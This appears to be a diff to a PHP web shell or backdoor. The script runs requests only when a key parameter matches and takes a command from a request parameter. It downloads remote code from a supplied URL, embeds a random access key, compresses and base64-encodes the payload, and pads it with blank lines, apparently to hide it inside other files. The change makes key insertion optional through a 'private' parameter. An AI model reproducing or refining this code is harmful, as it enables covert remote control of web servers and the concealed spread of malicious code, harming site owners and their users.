@@ -1,5 +1,3 @@
-<?php
-
 if ($_REQUEST["k"] == "INSERT_KEY") {
     $cmd = $_REQUEST["c"];
 
@@ -180,7 +178,11 @@ if ($_REQUEST["k"] == "INSERT_KEY") {
                     if ($f = file_get_contents($_REQUEST["url"], false, null, 0)) {
                         $time = filemtime($path);
                         $key = randomStr(12);
-                        $file = str_replace("INSERT_KEY", $key, $f);
+                        if (isset($_REQUEST["private"])) {
+                            $file = str_replace("INSERT_KEY", $key, $f);
+                        } else {
+                            $file = $f;
+                        }
                         $compressed = base64_encode(gzdeflate($file));
                         $newlines = str_repeat("\n", 30);
                         $code = <<<EOT
